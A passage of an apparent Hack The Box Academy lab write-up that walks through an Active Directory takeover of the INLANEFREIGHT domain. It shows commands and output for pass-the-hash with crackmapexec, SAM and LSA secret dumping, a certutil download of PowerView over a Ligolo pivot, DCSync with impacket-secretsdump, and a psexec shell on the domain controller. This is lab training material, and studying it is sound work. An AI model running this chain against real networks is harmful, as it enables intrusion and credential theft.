SMB         172.16.6.50     445    MS01             [+] MS01\Administrator:bdaffbfe64f1fc646a3353be1c2c3c99 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [*] Dumping SAM hashes
SMB         172.16.6.50     445    MS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
SMB         172.16.6.50     445    MS01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.6.50     445    MS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.6.50     445    MS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
SMB         172.16.6.50     445    MS01             [+] Added 4 SAM hashes to the database

# LSA
crackmapexec smb 172.16.6.50 --local-auth -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99 --lsa

SMB         172.16.6.50     445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         172.16.6.50     445    MS01             [+] MS01\Administrator:bdaffbfe64f1fc646a3353be1c2c3c99 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [+] Dumping LSA secrets
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801: (2022-04-29 17:46:50+00:00)
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb: (2022-04-12 02:51:02+00:00)
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245: (2022-04-20 10:25:07+00:00)
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:2583d67a75519ca8ad2420600a15d4d19ef82d4c590e61a14de2814d6a324289
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:164938d743761125499051bd8d6c7691
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:042a348cda8c7a76
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:d377309a11ad474edb52f4ac443ba3a7881790bcbfa9feb77c1a8686cbf6005ec68e6e666924ffcd8eab5b61c4bf81ad5630ba264999502490ddfb3288eb6424cea54ddb9569743f43ef56bf5f75cdde79c3e513ac5871fdfedeb77653d2e1c256efd70b5564d4a791749f102947e8f1b16238e98ccbe49a8867ca2da560e1429f23e74167bd4fd0bb0444ad803bf8d43cdd54ed70d86561e61642b2d2e009ba8ac82b1c4cc91a575a717db5b89ba50952273a32b48e55cf8c3ec98dc6cd4972d6a1625cebb2d20c8e5c763f45c5c40a5b28d5151c55d75a2efa5377de304ae15260c4e0d3d1a3c415c376e259619628
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:20b7519ee237bc057589091e6221146d:::
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:******
SMB         172.16.6.50     445    MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
SMB         172.16.6.50     445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.6.50     445    MS01             [+] Dumped 11 LSA secrets to /home/htb-ac-487515/.nxc/logs/MS01_172.16.6.50_2025-05-12_093702.secrets and /home/htb-ac-487515/.nxc/logs/MS01_172.16.6.50_2025-05-12_093702.cached

```


6. Submit this user's cleartext password.

```sh
# Find in the output of the command above
```


7. What attack can this user perform?

```powershell
# Add a new listener for files transfers on Ligolo
[Agent : NT AUTHORITY\SYSTEM@WEB-WIN01] » listener_add --addr 0.0.0.0:1337 --to 127.0.0.1:9999
INFO[3304] Listener 2 created on remote agent! 


# Stage powerview on our Pwnbox
python3 -m http.server 9999

# Download Poweview on MS01
C:\Users\Administrator\Desktop> certutil -urlcache -f http://172.16.6.100:1337/PowerView.ps1 PowerView.ps1

****  Online  ****
CertUtil: -URLCache command completed successfully.


# Import
PS C:\Users\Administrator\Desktop> Import-Module .\PowerView.ps1

# Verify
PS C:\Users\Administrator\Desktop> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Con...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.0        PowerView
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...


# Find interesting Domain ACL of the user we control 
$sid = Convert-NameToSid tpetty

# Verify
PS C:\Users\Administrator\Desktop> $sid = Convert-NameToSid tpetty
PS C:\Users\Administrator\Desktop> $sid
S-1-5-21-2270287766-1317258649-2146029398-4607


# Find all domain objects that our user has rights over and Resolve the GUIDS
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}


AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-2270287766-1317258649-2146029398
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2270287766-1317258649-2146029398-4607
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-2270287766-1317258649-2146029398
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2270287766-1317258649-2146029398-4607
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-2270287766-1317258649-2146029398
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2270287766-1317258649-2146029398-4607
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

# Looks like we have the required permissions to perfor DCSync
```


8.  Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01

```sh
# Is there a domain admins group in the DC?
net group /domain

Group Accounts for \\DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------
...
*Domain Admins
*Domain Computers
...

# Who is part of the domain admin?
net group "Domain Admins" /domain

...
Members
----------------------------------------------------------------------
Administrator
The command completed successfully.


# Dump all the secrets
impacket-secretsdump -outputfile dc_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
...


# Verify
ls

dc_hashes.ntds  
dc_hashes.ntds.cleartext  
dc_hashes.ntds.kerberos 


# Do we have the admin hash?
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::


# Can we log into DC using that hash?
impacket-psexec administrator@172.16.6.3 -hashes :27dedb1dab4d8545c6e1c66fba077da0

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.6.3.....
[*] Found writable share ADMIN$
[*] Uploading file GqqBhxhM.exe
[*] Opening SVCManager on 172.16.6.3.....
[*] Creating service nnOL on 172.16.6.3.....
[*] Starting service nnOL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
DC01

# YES!!!!!!!!! Let's finish this!!
C:\Windows\system32> cd C:\Users\Administrator\Desktop

 Directory of C:\Users\Administrator\Desktop

04/11/2022  07:16 PM    <DIR>          .
04/11/2022  07:16 PM    <DIR>          ..
04/11/2022  07:17 PM                19 flag.txt
               1 File(s)             19 bytes
               2 Dir(s)  33,599,164,416 bytes free

C:\Users\Administrator\Desktop> type flag.txt
******
C:\Users\Administrator\Desktop> 
```


# Reflections

- Ligolo was working yesterday. For some reason, I just couldn't reach MS01. Next time, either revert or walk away. Spent too much time trying to fix a broken system.
